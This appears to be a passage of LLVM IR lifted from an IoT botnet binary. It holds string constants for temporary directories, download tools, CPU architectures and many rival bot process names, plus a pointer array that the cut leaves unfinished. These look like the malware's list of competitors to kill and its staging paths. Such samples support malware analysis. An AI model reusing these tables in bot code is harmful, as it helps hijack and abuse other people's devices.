@global_var_22b68.544 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_22b78.545 = constant [6 x i8] c"/tmp/\00"
@global_var_22b80.546 = constant [6 x i8] c"/var/\00"
@global_var_22b88.547 = constant [6 x i8] c"/dev/\00"
@global_var_22b90.548 = constant [10 x i8] c"/var/run/\00"
@global_var_22b9c.549 = constant [10 x i8] c"/dev/shm/\00"
@global_var_22ba8.550 = constant [6 x i8] c"/mnt/\00"
@global_var_22bb0.551 = constant [7 x i8] c"/boot/\00"
@global_var_22bb8.552 = constant [6 x i8] c"/usr/\00"
@global_var_21f2c.564 = constant [5 x i8] c"wget\00"
@global_var_21f34.565 = constant [6 x i8] c"armv*\00"
@global_var_21270.566 = constant [5 x i8] c"bot*\00"
@global_var_21f3c.567 = constant [6 x i8] c"ntpd*\00"
@global_var_21284.568 = constant [7 x i8] c"hackz*\00"
@global_var_21f44.569 = constant [8 x i8] c"shitty*\00"
@global_var_21f4c.570 = constant [6 x i8] c"jack*\00"
@global_var_21248.571 = constant [6 x i8] c"mips*\00"
@global_var_21228.572 = constant [5 x i8] c"sex*\00"
@global_var_21f54.573 = constant [4 x i8] c"i86\00"
@global_var_21f58.574 = constant [5 x i8] c"ssh*\00"
@global_var_21268.575 = constant [5 x i8] c"sh4*\00"
@global_var_21278.576 = constant [11 x i8] c"jackmeoff*\00"
@global_var_21230.577 = constant [6 x i8] c"tftp*\00"
@global_var_21f60.578 = constant [4 x i8] c"i56\00"
@global_var_21f64.579 = constant [5 x i8] c"mips\00"
@global_var_21f6c.580 = constant [7 x i8] c"mipsel\00"
@global_var_21f74.581 = constant [4 x i8] c"sh4\00"
@global_var_21f78.582 = constant [4 x i8] c"x86\00"
@global_var_21f7c.583 = constant [5 x i8] c"i686\00"
@global_var_21f84.584 = constant [4 x i8] c"ppc\00"
@global_var_21f88.585 = constant [5 x i8] c"i586\00"
@global_var_21f90.586 = constant [7 x i8] c"mips64\00"
@global_var_21f98.587 = constant [6 x i8] c"sh2eb\00"
@global_var_21fa0.588 = constant [7 x i8] c"sh2elf\00"
@global_var_21fa8.589 = constant [4 x i8] c"arm\00"
@global_var_21fac.590 = constant [6 x i8] c"armv5\00"
@global_var_21fb4.591 = constant [8 x i8] c"armv4tl\00"
@global_var_21fbc.592 = constant [6 x i8] c"armv4\00"
@global_var_21fc4.593 = constant [6 x i8] c"armv6\00"
@global_var_21fcc.594 = constant [8 x i8] c"powerpc\00"
@global_var_21fd4.595 = constant [13 x i8] c"powerpc440fp\00"
@global_var_21fe4.596 = constant [5 x i8] c"m68k\00"
@global_var_21fec.597 = constant [6 x i8] c"sparc\00"
@global_var_21ff4.598 = constant [7 x i8] c"x86_64\00"
@global_var_21ffc.599 = constant [11 x i8] c"jackmymips\00"
@global_var_22008.600 = constant [13 x i8] c"jackmymips64\00"
@global_var_22018.601 = constant [13 x i8] c"jackmymipsel\00"
@global_var_22028.602 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_22034.603 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_22044.604 = constant [10 x i8] c"jackmysh4\00"
@global_var_22050.605 = constant [10 x i8] c"jackmyx86\00"
@global_var_2205c.606 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_22068.607 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_22078.608 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_22084.609 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_22090.610 = constant [11 x i8] c"jackmyi686\00"
@global_var_2209c.611 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_220ac.612 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_220c0.613 = constant [11 x i8] c"jackmyi586\00"
@global_var_220cc.614 = constant [11 x i8] c"jackmym68k\00"
@global_var_220d8.615 = constant [12 x i8] c"jackmysparc\00"
@global_var_220e4.616 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_220f4.617 = constant [11 x i8] c"hackmymips\00"
@global_var_22100.618 = constant [13 x i8] c"hackmymips64\00"
@global_var_22110.619 = constant [13 x i8] c"hackmymipsel\00"
@global_var_22120.620 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_2212c.621 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_2213c.622 = constant [10 x i8] c"hackmysh4\00"
@global_var_22148.623 = constant [10 x i8] c"hackmyx86\00"
@global_var_22154.624 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_22160.625 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_22170.626 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_2217c.627 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_22188.628 = constant [11 x i8] c"hackmyi686\00"
@global_var_22194.629 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_221a4.630 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_221b8.631 = constant [11 x i8] c"hackmyi586\00"
@global_var_221c4.632 = constant [11 x i8] c"hackmym68k\00"
@global_var_221d0.633 = constant [12 x i8] c"hackmysparc\00"
@global_var_221dc.634 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_221ec.635 = constant [3 x i8] c"b1\00"
@global_var_221f0.636 = constant [3 x i8] c"b2\00"
@global_var_221f4.637 = constant [3 x i8] c"b3\00"
@global_var_221f8.638 = constant [3 x i8] c"b4\00"
@global_var_221fc.639 = constant [3 x i8] c"b5\00"
@global_var_22200.640 = constant [3 x i8] c"b6\00"
@global_var_22204.641 = constant [3 x i8] c"b7\00"
@global_var_22208.642 = constant [3 x i8] c"b8\00"
@global_var_2220c.643 = constant [3 x i8] c"b9\00"
@global_var_22210.644 = constant [4 x i8] c"b10\00"
@global_var_22214.645 = constant [4 x i8] c"b11\00"
@global_var_22218.646 = constant [4 x i8] c"b12\00"
@global_var_2221c.647 = constant [4 x i8] c"b13\00"
@global_var_22220.648 = constant [4 x i8] c"b14\00"
@global_var_22224.649 = constant [4 x i8] c"b15\00"
@global_var_22228.650 = constant [4 x i8] c"b16\00"
@global_var_2222c.651 = constant [4 x i8] c"b17\00"
@global_var_22230.652 = constant [4 x i8] c"b18\00"
@global_var_22234.653 = constant [4 x i8] c"b19\00"
@global_var_22238.654 = constant [4 x i8] c"b20\00"
@global_var_2223c.655 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_22250.656 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_2225c.657 = constant [10 x i8] c"dvrHelper\00"
@global_var_22268.658 = constant [8 x i8] c"FDFDHFC\00"
@global_var_22270.659 = constant [5 x i8] c"FEUB\00"
@global_var_22278.660 = constant [9 x i8] c"FTUdftui\00"
@global_var_22284.661 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_22290.662 = constant [6 x i8] c"jhUOH\00"
@global_var_22298.663 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_222a4.664 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_222b0.665 = constant [8 x i8] c"kmymips\00"
@global_var_222b8.666 = constant [10 x i8] c"kmymips64\00"
@global_var_222c4.667 = constant [10 x i8] c"kmymipsel\00"
@global_var_222d0.668 = constant [9 x i8] c"kmysh2eb\00"
@global_var_222dc.669 = constant [10 x i8] c"kmysh2elf\00"
@global_var_222e8.670 = constant [7 x i8] c"kmysh4\00"
@global_var_222f0.671 = constant [7 x i8] c"kmyx86\00"
@global_var_222f8.672 = constant [9 x i8] c"kmyarmv5\00"
@global_var_22304.673 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_22310.674 = constant [9 x i8] c"kmyarmv4\00"
@global_var_2231c.675 = constant [9 x i8] c"kmyarmv6\00"
@global_var_22328.676 = constant [8 x i8] c"kmyi686\00"
@global_var_22330.677 = constant [11 x i8] c"kmypowerpc\00"
@global_var_2233c.678 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_2234c.679 = constant [8 x i8] c"kmyi586\00"
@global_var_22354.680 = constant [8 x i8] c"kmym68k\00"
@global_var_2235c.681 = constant [9 x i8] c"kmysparc\00"
@global_var_22368.682 = constant [10 x i8] c"kmyx86_64\00"
@global_var_22374.683 = constant [8 x i8] c"lolmips\00"
@global_var_2237c.684 = constant [10 x i8] c"lolmips64\00"
@global_var_22388.685 = constant [10 x i8] c"lolmipsel\00"
@global_var_22394.686 = constant [9 x i8] c"lolsh2eb\00"
@global_var_223a0.687 = constant [10 x i8] c"lolsh2elf\00"
@global_var_223ac.688 = constant [7 x i8] c"lolsh4\00"
@global_var_223b4.689 = constant [7 x i8] c"lolx86\00"
@global_var_223bc.690 = constant [9 x i8] c"lolarmv5\00"
@global_var_223c8.691 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_223d4.692 = constant [9 x i8] c"lolarmv4\00"
@global_var_223e0.693 = constant [9 x i8] c"lolarmv6\00"
@global_var_223ec.694 = constant [8 x i8] c"loli686\00"
@global_var_223f4.695 = constant [11 x i8] c"lolpowerpc\00"
@global_var_22400.696 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_22410.697 = constant [8 x i8] c"loli586\00"
@global_var_22418.698 = constant [8 x i8] c"lolm68k\00"
@global_var_22420.699 = constant [9 x i8] c"lolsparc\00"
@global_var_2242c.700 = constant [8 x i8] c"RYrydry\00"
@global_var_22434.701 = constant [8 x i8] c"telmips\00"
@global_var_2243c.702 = constant [10 x i8] c"telmips64\00"
@global_var_22448.703 = constant [10 x i8] c"telmipsel\00"
@global_var_22454.704 = constant [9 x i8] c"telsh2eb\00"
@global_var_22460.705 = constant [10 x i8] c"telsh2elf\00"
@global_var_2246c.706 = constant [7 x i8] c"telsh4\00"
@global_var_22474.707 = constant [7 x i8] c"telx86\00"
@global_var_2247c.708 = constant [9 x i8] c"telarmv5\00"
@global_var_22488.709 = constant [11 x i8] c"telarmv4tl\00"
@global_var_22494.710 = constant [9 x i8] c"telarmv4\00"
@global_var_224a0.711 = constant [9 x i8] c"telarmv6\00"
@global_var_224ac.712 = constant [8 x i8] c"teli686\00"
@global_var_224b4.713 = constant [11 x i8] c"telpowerpc\00"
@global_var_224c0.714 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_224d0.715 = constant [8 x i8] c"teli586\00"
@global_var_224d8.716 = constant [8 x i8] c"telm68k\00"
@global_var_224e0.717 = constant [9 x i8] c"telsparc\00"
@global_var_224ec.718 = constant [10 x i8] c"telx86_64\00"
@global_var_224f8.719 = constant [12 x i8] c"TwoFacemips\00"
@global_var_22504.720 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_22514.721 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_22524.722 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_22534.723 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_22544.724 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_22550.725 = constant [11 x i8] c"TwoFacex86\00"
@global_var_2255c.726 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_2256c.727 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_2257c.728 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_2258c.729 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_2259c.730 = constant [12 x i8] c"TwoFacei686\00"
@global_var_225a8.731 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_225b8.732 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_225cc.733 = constant [12 x i8] c"TwoFacei586\00"
@global_var_225d8.734 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_225e4.735 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_225f4.736 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_22604.737 = constant [9 x i8] c"UYyuyioy\00"
@global_var_22610.738 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_2261c.739 = constant [5 x i8] c"xxb1\00"
@global_var_22624.740 = constant [5 x i8] c"xxb2\00"
@global_var_2262c.741 = constant [5 x i8] c"xxb3\00"
@global_var_22634.742 = constant [5 x i8] c"xxb4\00"
@global_var_2263c.743 = constant [5 x i8] c"xxb5\00"
@global_var_22644.744 = constant [5 x i8] c"xxb6\00"
@global_var_2264c.745 = constant [5 x i8] c"xxb7\00"
@global_var_22654.746 = constant [5 x i8] c"xxb8\00"
@global_var_2265c.747 = constant [5 x i8] c"xxb9\00"
@global_var_22664.748 = constant [6 x i8] c"xxb10\00"
@global_var_2266c.749 = constant [6 x i8] c"xxb11\00"
@global_var_22674.750 = constant [6 x i8] c"xxb12\00"
@global_var_2267c.751 = constant [6 x i8] c"xxb13\00"
@global_var_22684.752 = constant [6 x i8] c"xxb14\00"
@global_var_2268c.753 = constant [6 x i8] c"xxb15\00"
@global_var_22694.754 = constant [6 x i8] c"xxb16\00"
@global_var_2269c.755 = constant [6 x i8] c"xxb17\00"
@global_var_226a4.756 = constant [6 x i8] c"xxb18\00"
@global_var_226ac.757 = constant [6 x i8] c"xxb19\00"
@global_var_226b4.758 = constant [6 x i8] c"xxb20\00"
@global_var_226bc.759 = constant i32 49
@global_var_226c0.760 = constant i32 50
@global_var_226c4.761 = constant i32 51
@global_var_226c8.762 = constant i32 52
@global_var_226cc.763 = constant i32 53
@global_var_226d0.764 = constant i32 54
@global_var_226d4.765 = constant i32 55
@global_var_226d8.766 = constant i32 56
@global_var_226dc.767 = constant i32 57
@global_var_226e0.768 = constant [3 x i8] c"10\00"
@global_var_226e4.769 = constant [3 x i8] c"11\00"
@global_var_226e8.770 = constant [3 x i8] c"12\00"
@global_var_226ec.771 = constant [3 x i8] c"13\00"
@global_var_226f0.772 = constant [3 x i8] c"14\00"
@global_var_226f4.773 = constant [3 x i8] c"15\00"
@global_var_226f8.774 = constant [3 x i8] c"16\00"
@global_var_226fc.775 = constant [3 x i8] c"17\00"
@global_var_22700.776 = constant [3 x i8] c"18\00"
@global_var_22704.777 = constant [3 x i8] c"19\00"
@global_var_22708.778 = constant [3 x i8] c"20\00"
@global_var_2270c.779 = constant [3 x i8] c"bb\00"
@global_var_22710.780 = constant [11 x i8] c"busybotnet\00"
@global_var_2271c.781 = constant [5 x i8] c"pppd\00"
@global_var_22724.782 = constant [6 x i8] c"pppoe\00"
@global_var_2272c.783 = constant [5 x i8] c"wput\00"
@global_var_22734.784 = constant [3 x i8] c"B1\00"
@global_var_22738.785 = constant [3 x i8] c"B2\00"
@global_var_2273c.786 = constant [3 x i8] c"B3\00"
@global_var_22740.787 = constant [3 x i8] c"B4\00"
@global_var_22744.788 = constant [3 x i8] c"B5\00"
@global_var_22748.789 = constant [3 x i8] c"B6\00"
@global_var_2274c.790 = constant [3 x i8] c"B7\00"
@global_var_22750.791 = constant [3 x i8] c"B8\00"
@global_var_22754.792 = constant [3 x i8] c"B9\00"
@global_var_22758.793 = constant [4 x i8] c"B10\00"
@global_var_2275c.794 = constant [4 x i8] c"B11\00"
@global_var_22760.795 = constant [4 x i8] c"B12\00"
@global_var_22764.796 = constant [4 x i8] c"B13\00"
@global_var_22768.797 = constant [4 x i8] c"B14\00"
@global_var_2276c.798 = constant [4 x i8] c"B15\00"
@global_var_22770.799 = constant [4 x i8] c"B16\00"
@global_var_22774.800 = constant [4 x i8] c"B17\00"
@global_var_22778.801 = constant [4 x i8] c"B18\00"
@global_var_2277c.802 = constant [4 x i8] c"B20\00"
@global_var_22780.803 = constant [10 x i8] c"dvrhelper\00"
@global_var_2278c.804 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f2c.564, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21f34.565, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21270.566, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21f3c.567, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21284.568, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21f44.569, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21f4c.570, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21248.571, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21228.572, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f54.573, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f58.574, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21268.575, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21278.576, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21230.577, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f60.578, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f64.579, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21f6c.580, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f74.581, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f78.582, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f7c.583, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f84.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f88.585, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f64.579, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21f90.586, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21f6c.580, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21f98.587, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21fa0.588, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f74.581, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21f78.582, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21fa8.589, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fac.590, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21fb4.591, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fbc.592, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fc4.593, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f7c.583, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21fcc.594, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21fd4.595, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21f88.585, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21fe4.596, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21fec.597, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21ff4.598, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21ffc.599, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22008.600, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22018.601, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22028.602, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22034.603, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22044.604, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22050.605, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2205c.606, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22068.607, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22078.608, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22084.609, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22090.610, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2209c.611, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_220ac.612, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_220c0.613, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_220cc.614, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_220d8.615, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_220e4.616, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_220f4.617, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22100.618, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22110.619, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22120.620, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2212c.621, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2213c.622, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22148.623, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22154.624, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22160.625, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22170.626, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2217c.627, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22188.628, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22194.629, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_221a4.630, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_221b8.631, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_221c4.632, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_221d0.633, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_221dc.634, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_221ec.635, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_221f0.636, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_221f4.637, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_221f8.638, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_221fc.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22200.640, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22204.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22208.642, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2220c.643, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22210.644, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22214.645, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22218.646, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2221c.647, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22220.648, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22224.649, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22228.650, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2222c.651, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22230.652, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22234.653, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22238.654, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_2223c.655, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22250.656, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2225c.657, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22268.658, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22270.659, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22278.660, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22284.661, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22290.662, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22298.663, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_222a4.664, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_222b0.665, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_222b8.666, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_222c4.667, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_222d0.668, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_222dc.669, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_222e8.670, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_222f0.671, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_222f8.672, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22304.673, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22310.674, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2231c.675, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22328.676, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22330.677, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_2233c.678, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2234c.679, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22354.680, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2235c.681, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22368.682, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22374.683, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2237c.684, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22388.685, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22394.686, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_223a0.687, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_223ac.688, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_223b4.689, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_223bc.690, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_223c8.691, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_223d4.692, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_223e0.693, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_223ec.694, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_223f4.695, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_22400.696, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22410.697, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22418.698, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22420.699, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2242c.700, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22434.701, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2243c.702, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22448.703, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22454.704, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22460.705, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* 